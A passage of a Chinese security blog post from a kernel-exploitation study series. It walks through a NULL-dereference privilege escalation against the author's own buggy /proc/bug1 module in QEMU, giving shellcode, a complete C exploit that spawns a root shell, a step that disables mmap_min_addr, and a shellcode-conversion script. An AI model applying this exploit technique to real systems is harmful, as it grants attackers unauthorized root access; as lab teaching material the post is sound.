+<h3 id="设置payload"><a class="headerlink" href="#设置payload" title="设置payload"></a>设置payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">汇编对应的payload</div><div class="line">xor %eax,%eax</div><div class="line">call 0xc10680d0</div><div class="line">call 0xc1067f30</div><div class="line">ret</div><div class="line"></div><div class="line"></div><div class="line">编译上述汇编</div><div class="line">$ gcc -o payload payload.s -nostdlib -Ttext=0 </div><div class="line"></div><div class="line">得到payload的机器码</div><div class="line">$ objdump -d payload</div><div class="line">payload：     文件格式 elf32-i386</div><div class="line"></div><div class="line"></div><div class="line">Disassembly of section .text:</div><div class="line"></div><div class="line">00000000 &lt;__bss_start-0x100d&gt;:</div><div class="line">   0:	31 c0                	xor    %eax,%eax</div><div class="line">   2:	e8 c9 80 06 c1       	call   c10680d0 &lt;_end+0xc10670c0&gt;</div><div class="line">   7:	e8 24 7f 06 c1       	call   c1067f30 &lt;_end+0xc1066f20&gt;</div><div class="line">   c:	c3                   	ret   </div><div class="line"></div><div class="line">payload机器码</div><div class="line">$ \x31\xc0\xe8\xc9\x80\x06\xc1\xe8\x24\x7f\x06\xc1\xc3</div></pre></td></tr></table></figure>
+<h3 id="最终的exp"><a class="headerlink" href="#最终的exp" title="最终的exp"></a>最终的exp</h3><p>我们需要分配0地址空间然后放入shellcode，然后jmp过去执行shellcode，使当前进程有root权限，然后执行一个system(“/bin/sh”);在程序返回用户态之后拿到一个root的shell。<br/><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">$ vim <span class="built_in">exp</span>.c</div><div class="line">$ cat <span class="built_in">exp</span>.c</div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></div><div class="line"><span class="keyword">char</span> payload[] = <span class="string">"\x31\xc0\xe8\xc9\x80\x06\xc1\xe8\x24\x7f\x06\xc1\xc3"</span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">{</div><div class="line">        mmap(<span class="number">0</span>, <span class="number">4096</span>,PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS ,<span class="number">-1</span>, <span class="number">0</span>);</div><div class="line">        <span class="built_in">memcpy</span>(<span class="number">0</span>, payload, <span class="keyword">sizeof</span>(payload));</div><div class="line">        <span class="keyword">int</span> fd = open(<span class="string">"/proc/bug1"</span>, O_WRONLY);</div><div class="line">        write(fd, <span class="string">"wing"</span>, <span class="number">4</span>);</div><div class="line">        system(<span class="string">"/bin/sh"</span>);<span class="comment">//get root shell</span></div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">}</div><div class="line">$ gcc -<span class="keyword">static</span> -o <span class="built_in">exp</span> <span class="built_in">exp</span>.c</div></pre></td></tr></table></figure></p>
+<h3 id="测试exp"><a class="headerlink" href="#测试exp" title="测试exp"></a>测试exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ./exp</div></pre></td></tr></table></figure>
+<p><img alt="" src="./linux-kernel expoit  study (3)---NULL dereference  Swings'Blog浮生若梦CTFerBinaryPython/984a5526d03f5df1.png"/></p>
+<blockquote>
+<p>图中均是#不是<code>$</code>，但是从gdb中可以看到payload已经执行，所以如果是普通用户的话，是可以拿到root shell，当然是在0地址可以mmap情况下。<br/>mmap_min_addr禁止用户映射低地址。</p>
+</blockquote>
+<h2 id="qemu中添加普通用户并测试"><a class="headerlink" href="#qemu中添加普通用户并测试" title="qemu中添加普通用户并测试"></a>qemu中添加普通用户并测试</h2><blockquote>
+<p>使用adduser添加用户<br/><figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">adduser </span>wing</div></pre></td></tr></table></figure></p>
+<p>read-only file system 解决办法</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">注意remount, rw之间需要空格</div><div class="line"><span class="comment"># mount -o remount, rw /</span></div></pre></td></tr></table></figure>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># adduser wing</span></div><div class="line">adduser : /etc/group: No such <span class="built_in">file</span> <span class="keyword">or</span> <span class="built_in">directory</span></div><div class="line">adduser : /home/wing: No such <span class="built_in">file</span> <span class="keyword">or</span> <span class="built_in">directory</span></div></pre></td></tr></table></figure>
+<blockquote>
+<p>解决办法:touch对应的文件，并建立相关的目录</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># touch /etc/group</span></div><div class="line"><span class="comment"># touch /etc/passwd</span></div><div class="line"><span class="comment"># touch /etc/shadow</span></div><div class="line"><span class="comment"># mkdir -p /home/wing</span></div><div class="line"><span class="comment"># adduser wing</span></div><div class="line">adduser : use <span class="string">'wing'</span> <span class="keyword">in</span> use</div></pre></td></tr></table></figure>
+<blockquote>
+<p>切换成对应的普通用户并运行exp,运行过程中出现问题 </p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># sysctl -w vm.mmap_min_addr="0"</span></div></pre></td></tr></table></figure>
+<blockquote>
+<p>分析原因(图exp-error-reason)发现是在mmap之后出错 都没走到0地址处,2.6.32内核已经使用mmap_min_addr作为缓解措施mmap_min_addr为4096，需要设置下mmap_min_addr</p>
+<p>设置完成之后，重新运行exp即可得到root shell<br/><img alt="" src="./linux-kernel expoit  study (3)---NULL dereference  Swings'Blog浮生若梦CTFerBinaryPython/d9c6c7f76d44cd49.png"/></p>
+</blockquote>
+<h2 id="引用"><a class="headerlink" href="#引用" title="引用"></a>引用</h2><p>Joker‘ markdown<br/><a href="http://bobao.360.cn/learning/detail/3702.html" rel="external" target="_blank">【系列分享】Linux 内核漏洞利用教程（二）：两个Demo</a><br/><a href="https://beyermatthias.de/blog/2016/11/01/setup-for-linux-kernel-dev-using-qemu/" rel="external" target="_blank">Setup for linux kernel dev using qemu</a><br/><a href="https://tc.gtisc.gatech.edu/bss/2014/r/kernel-exploits.pdf" rel="external" target="_blank">linux_kernel_exploit</a></p>
+<p><a href="https://wiki.debian.org/mmap_min_addr" rel="external" target="_blank">mmap_min_addr - Debian Wiki</a></p>
+<h2 id="用到的payload转换脚本"><a class="headerlink" href="#用到的payload转换脚本" title="用到的payload转换脚本"></a>用到的payload转换脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*-coding:utf-8-*-</span></div><div class="line">__author__ = <span class="string">'joker'</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line">payload = <span class="string">"""</span></div><div class="line">   0:	31 c0                	xor    %eax,%eax</div><div class="line">   2:	e8 b9 7f 06 c1       	call   c1067fc0 &lt;_end+0xc1066f94&gt;</div><div class="line">   7:	e8 14 7e 06 c1       	call   c1067e20 &lt;_end+0xc1066df4&gt;</div><div class="line">   c:	81 ec 00 01 00 00    	sub    $0x100,%esp</div><div class="line">  12:	50                   	push   %eax</div><div class="line">  13:	50                   	push   %eax</div><div class="line">  14:	68 2f 73 68 00       	push   $0x68732f</div><div class="line">  19:	68 2f 62 69 6e       	push   $0x6e69622f</div><div class="line">  1e:	89 e1                	mov    %esp,%ecx</div><div class="line">  20:	16                   	push   %ss</div><div class="line">  21:	51                   	push   %ecx</div><div class="line">  22:	9c                   	pushf</div><div class="line">  23:	0e                   	push   %cs</div><div class="line">  24:	68 5c 71 44 c1       	push   $0xc144715c</div><div class="line">  29:	cf                   	iret"""</div><div class="line"></div><div class="line">pattern = re.compile(<span class="string">" {2,}"</span>,re.S)</div><div class="line">payload_all = <span class="string">""</span></div><div class="line">lines = payload.split(<span class="string">"\n"</span>)[<span class="number">1</span>:]</div><div class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</div><div class="line">    text,_= pattern.subn(<span class="string">""</span>,line.split(<span class="string">"\t"</span>)[<span class="number">1</span>])</div><div class="line">    payload1 = <span class="string">"\\x"</span> + text.replace(<span class="string">" "</span>,<span class="string">"\\x"</span>)</div><div class="line">    payload_all += payload1</div><div class="line"></div><div class="line"><span class="keyword">print</span> payload_all</div></pre></td></tr></table></figure>
+</div>
+</div>
+<div class="copyright">
+<p><span>本文标题:</span><a href="/2017/04/08/write-kernel-exploits-1/">linux-kernel expoit  study (3)---NULL dereference</a></p>
+<p><span>文章作者:</span><a href="/" title="访问 Swing|浮生若梦 的个人博客">Swing|浮生若梦</a></p>
+<p><span>发布时间:</span>2017年04月08日 - 00时00分</p>
+<p><span>最后更新:</span>2017年04月09日 - 23时42分</p>
+<p>
+<span>原始链接:</span><a class="post-url" href="/2017/04/08/write-kernel-exploits-1/" title="linux-kernel expoit  study (3)---NULL dereference">http://bestwing.me/2017/04/08/write-kernel-exploits-1/</a>
+<span class="copy-path" data-clipboard-text="原文: http://bestwing.me/2017/04/08/write-kernel-exploits-1/　　作者: Swing|浮生若梦" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+<script src="./linux-kernel expoit  study (3)---NULL dereference  Swings'Blog浮生若梦CTFerBinaryPython/clipboard.min.js"></script>
+<script> var clipboard = new Clipboard('.copy-path'); </script>
+</p>
+<p>
+<span>许可协议:</span><i class="fa fa-creative-commons"></i> <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" rel="license" target="_blank" title="中国大陆 (CC BY-NC-SA 3.0 CN)">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+</div>
+<nav id="article-nav">
+<a class="article-nav-link-wrap" href="/2017/04/10/write-kernel-exploits-2/" id="article-nav-newer">
+<strong class="article-nav-caption">&lt;</strong>
+<div class="article-nav-title">
+        
+          linux-kernel expoit  study (3)---栈溢出
+        
+      </div>
+</a>
+<a class="article-nav-link-wrap" href="/2017/04/06/add-a-system-call/" id="article-nav-older">
+<div class="article-nav-title">linux-kernel expoit  study (2)---添加系统调用</div>
+<strong class="article-nav-caption">&gt;</strong>
+</a>
+</nav>
+<!-- -- ���Ӿ���ͼ�� ---->
+<div class="post-donate">
+<div class="donate_bar center" id="donate_board">
+<a class="btn_donate" href="javascript:;" id="btn_donate" title="����"></a>
+<span class="donate_txt">
+           ↑<br/>
+		   如果觉得文章对你有用，不妨赏一点小钱吧！
+        </span>
+<br/>
+</div>
+<div class="donate_bar center hidden" id="donate_guide">
+<!-- ֧��������ͼ�� -->
+<img alt="֧��������" src="./linux-kernel expoit  study (3)---NULL dereference  Swings'Blog浮生若梦CTFerBinaryPython/zhifubao.jpg"/>
+<!-- ΢�Ŵ���ͼ�� -->
+<img alt="΢�Ŵ���" src="./linux-kernel expoit  study (3)---NULL dereference  Swings'Blog浮生若梦CTFerBinaryPython/weixin.jpg"/>
+</div>
+<script type="text/javascript">
+		document.getElementById('btn_donate').onclick = function(){
+			$('#donate_board').addClass('hidden');
+			$('#donate_guide').removeClass('hidden');
+		}
+	</script>
+</div>
+<!-- -- ���Ӿ���ͼ�� ---->
+</article>
+<div class="toc-article" id="toc">
+<strong class="toc-title">文章目录</strong>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#write-linux-kernel-exploit-1"><span class="toc-number">1.</span> <span class="toc-text">write linux kernel exploit 1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言-重新配置一下-busybox"><span class="toc-number">1.1.</span> <span class="toc-text">前言  -重新配置一下 busybox</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#step-1"><span class="toc-number">1.1.1.</span> <span class="toc-text">step 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step-2-创建对应的目录"><span class="toc-number">1.1.2.</span> <span class="toc-text">step 2 创建对应的目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解决can’t-not-open-dev-tty2"><span class="toc-number">1.1.3.</span> <span class="toc-text">解决can’t not open /dev/tty2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#qume-启用busybox"><span class="toc-number">1.1.4.</span> <span class="toc-text">qume 启用busybox</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NULL-dereference"><span class="toc-number">1.2.</span> <span class="toc-text">NULL dereference</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#一个简单的demo"><span class="toc-number">1.2.1.</span> <span class="toc-text">一个简单的demo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#简单的测试"><span class="toc-number">1.2.2.</span> <span class="toc-text">简单的测试</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#在qemu中运行并测试"><span class="toc-number">1.3.</span> <span class="toc-text">在qemu中运行并测试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#poc测试"><span class="toc-number">1.3.1.</span> <span class="toc-text">poc测试</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">1.4.</span> <span class="toc-text">exp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#实现方法-1-通用获取"><span class="toc-number">1.4.1.</span> <span class="toc-text">实现方法 1 通用获取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#实现方法-2-简单的取得commit-creds、prepare-kernel-cred地址"><span class="toc-number">1.4.2.</span> <span class="toc-text">实现方法 2  简单的取得commit_creds、prepare_kernel_cred地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#设置payload"><span class="toc-number">1.4.3.</span> <span class="toc-text">设置payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#最终的exp"><span class="toc-number">1.4.4.</span> <span class="toc-text">最终的exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#测试exp"><span class="toc-number">1.4.5.</span> <span class="toc-text">测试exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#qemu中添加普通用户并测试"><span class="toc-number">1.5.</span> <span class="toc-text">qemu中添加普通用户并测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#引用"><span class="toc-number">1.6.</span> <span class="toc-text">引用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#用到的payload转换脚本"><span class="toc-number">1.7.</span> <span class="toc-text">用到的payload转换脚本</span></a></li></ol></li></ol>
+</div>
+<input id="tocButton" title="点击按钮隐藏或者显示文章目录" type="button" value="隐藏目录"/>
+<script src="./linux-kernel expoit  study (3)---NULL dereference  Swings'Blog浮生若梦CTFerBinaryPython/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+    }
+</script>
+<div class="share">
+<div class="bdsharebuttonbox">
+<a class="bds_more" data-cmd="more" href="#"></a>
+<a class="bds_tsina" data-cmd="tsina" href="#" title="分享到新浪微博"></a>
+<a class="bds_sqq" data-cmd="sqq" href="#" title="分享给 QQ 好友"></a>
+<a class="bds_copy" data-cmd="copy" href="#" title="复制网址"></a>
+<a class="bds_mail" data-cmd="mail" href="#" title="通过邮件分享"></a>
+<a class="bds_weixin" data-cmd="weixin" href="#" title="生成文章二维码"></a>
+</div>
+<script>
+        window._bd_share_config={
+            "common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+    </script>
+</div>
+<div class="bdsharebuttonbox">
+<a class="fx fa-weibo bds_tsina" data-cmd="tsina" href="#" title="分享到新浪微博"></a>
+<a class="fx fa-weixin bds_weixin" data-cmd="weixin" href="#" title="分享到微信"></a>
+<a class="fx fa-qq bds_sqq" data-cmd="sqq" href="#" title="分享到QQ好友"></a>
+<a class="fx fa-facebook-official bds_fbook" data-cmd="fbook" href="#" title="分享到Facebook"></a>
+<a class="fx fa-twitter bds_twi" data-cmd="twi" href="#" title="分享到Twitter"></a>
+<a class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" href="#" title="分享到linkedin"></a>
+<a class="fx fa-files-o bds_copy" data-cmd="copy" href="#" title="分享到复制网址"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+<div class="duoshuo" id="comments">
+<!-- 多说评论框 start -->
+<div class="ds-thread" data-thread-key="2017/04/08/write-kernel-exploits-1/" data-title="linux-kernel expoit  study (3)---NULL dereference" data-url="http://bestwing.me/2017/04/08/write-kernel-exploits-1/"></div>
+<!-- 多说评论框 end -->
+<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+<script type="text/javascript">
+    var duoshuoQuery = {short_name:"WinMin"};
+    (function() {
+        var ds = document.createElement('script');
+        ds.type = 'text/javascript';ds.async = true;
+        ds.src = '/js/embed.js';
+        ds.charset = 'UTF-8';
+        (document.getElementsByTagName('head')[0] 
+         || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+    </script>
+<!-- 多说公共JS代码 end -->
+</div>
+<div class="scroll" id="post-nav-button">
+<a href="/2017/04/10/write-kernel-exploits-2/" title="上一篇: linux-kernel expoit  study (3)---栈溢出">
+<i class="fa fa-angle-left"></i>
+</a>
+<a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+<a href="/2017/04/06/add-a-system-call/" title="下一篇: linux-kernel expoit  study (2)---添加系统调用">
+<i class="fa fa-angle-right"></i>
+</a>
+</div>
+<ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/05/07/2017-SSCTF-Pwn/">2017- SSCTF-Pwn250</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/01/2017-defcon-peROPdo/">2017 DEFCON ---  peROPdo writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/23/2017-360chunqiu-online/">2017 360春秋杯线上 部分Pwn writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/23/after-upgrade-gdb-wont-attach-to-process/">解决升级pwntools  gdb.attach不能弹起gdb</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/17/cstc-xatu-writeup/">第三届全国网络空间安全技术大赛(线上初赛)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/10/write-kernel-exploits-2/">linux-kernel expoit  study (3)---栈溢出</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/08/write-kernel-exploits-1/">linux-kernel expoit  study (3)---NULL dereference</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/06/add-a-system-call/">linux-kernel expoit  study (2)---添加系统调用</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/04/Complie-linux-kernel-and-running-it-using-qemu/">linux-kernel expoit  study（1） ---编译并用qemu运行内核</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/01/hoo_free/">Hook_free  解决保护全开的问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/30/《程序员的自我修养》读书笔记/">《程序员的自我修养》读书笔记---ELF文件结构</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/29/2017-0CTF-部分Pwn/">2017年 0CTF---部分Pwn writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/28/愿你出走半生，归来仍是少年/">不忘初心</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/26/markdown图片设置方法/">Markdown中对图片进行居中,设置大小等操作</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/24/stack-overflow-four/">基础栈溢出复习 四 之 BROP</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/20/stack-overflow-three/">基础栈溢出复习 三 之 SROP</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/19/stack-overflow-two/">基础栈溢出复习 二 之 ROP</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/18/stack-overflow-one/">基础栈溢出复习 之基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/15/2017-NJCTF-part-writeup/">2017 XCTF 南京站　线上赛　NJCTF</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/08/angr-study/">angr初探</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/28/ichunqiu-CTF-Pwn-2017-2/">i 春秋-CTF-Pwn-2017-2</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/27/python-沙箱-逃逸/">Python沙箱逃逸</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/15/Memory Leak &amp; DynELF/">leak技巧以及DynELF的温习</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/13/WiFi_Attack/">蹭隔壁的WiFI</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/02/Those-of-the-Breakpoint/">断点的那些事</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/26/使用Git开发使用介绍/">使用Git开发使用介绍</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/19/Windows-Kernel-Exploit-Study-1/">Windows Kernel Exploit Study(1)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/17/pwnable刷题日记/">pwnable刷题日记 第一阶梯部分</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/30/one-gadget-rce/">One gadget rce</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/15/CSRF-Preliminary-Study/">CSRF初探</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/23/ichuqiu-reverse-November/">ichunqiu百度杯-十一月reverse专题</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/18/Second Shanghai college students ' network security competition/">第二届上海市大学生网络安全大赛 Re400</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/13/2016-SUCTF-Writeup-pwn/">2016-SUCTF-PWN-Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/10/As-a-Software security engineer-must-know-and-read-books-recommended/">作为一个二进制安全学习者必知必读的书籍推荐</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/08/ichuqiu-pwn-November/">ichunqiu百度杯-十一月pwn专题</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/22/基于zio的exp初次尝试/">一次基于zio编写pwn的exp的尝试</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/16/2016-sycgeek-Writeup/">Sycsec-极客大挑战-Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/29/2016-NUCA-pwn-Writeup/">NUCA---pwn-2016</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/24/The_hulling_method/">逆向学习——脱壳方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/18/tell_myself/">有时候想想 是得规划一下自己了</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/11/2016-Hs-ctf-SeeSea-writeup/">2016-中国·西安 华山杯 Writeup-SeeSea</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/10/Common types of RSA/">一大波RSA就要来了~~</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/08/2016-NUCA-Reverse-Writeup/">全国高校网安联赛--逆向篇</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/05/2016-ichunqiu-September/">百度杯 CTF夺旗大赛 ---ichunqiu</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/05/Want to say a bit/">一点想说的</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/27/John the Ripper password cracker/">John 破解rar 或者 zip密码</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/23/wooyun搭建/">记一次在服务器上wooyun搜索站的搭建</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/10/ubuntu-mount-new-disk/">ubuntu系统新增硬盘空间</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/29/渗透测试/">这是一波 ichunqiu在线挑战攻略 -(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/29/记一次Hexo主题的修改/">记一次Hexo主题修改</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/27/CTF-Misc&amp;Crypto-Tools/">工具以及脚本的整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/04/i春秋30强部分通关指南/">i春秋30强部分write-up</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/04/ichunqiu-Tencent-top30-Pwn/">ichunqiu-Pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/04/浅谈格式化字符串漏洞/">浅谈格式化字符串漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/24/利用阿里云搭建VPN/">利用阿里云搭建VPN</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/04/2016黑客西部大会/">2016黑客西部大会</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/28/2016-Networ-space-security-technology-competition-of-shaanxi/">陕西省网络空间安全技术大赛</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/26/2016-PCTF-Writup/">Phrack--CTF 整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/25/2015-CCTF-Writeup/">酱油之旅--CCTF</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/14/Hexo-Use/">Hexo 使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/27/Hexo-Theme/">Hexo 主题：SPFK</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/27/Hexo-use-Introduction/">Hexo的使用介绍</a></li></ul>
+<script src="./linux-kernel expoit  study (3)---NULL dereference  Swings'Blog浮生若梦CTFerBinaryPython/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script>
+        $(".post-list").addClass("toc-article");
+        $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+            }
+        })
+    </script>
+<script>
+</script>
+</div>
+<footer id="footer">
+<div class="outer">
+<div id="footer-info">
+<div class="footer-left">
+                © 2017 Swing|浮生若梦
+            </div>
+<div class="footer-right">
+<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/luuman/hexo-theme-spfk" target="_blank">spfk</a> by luuman
+            </div>
+</div>
+<div class="visit">
+<span id="busuanzi_container_site_pv" style="display:none">
+<span id="site-visit">表哥到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+</span>
+</span>
+<span>, </span>
+<span id="busuanzi_container_page_pv" style="display:none">
+<span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+</span>
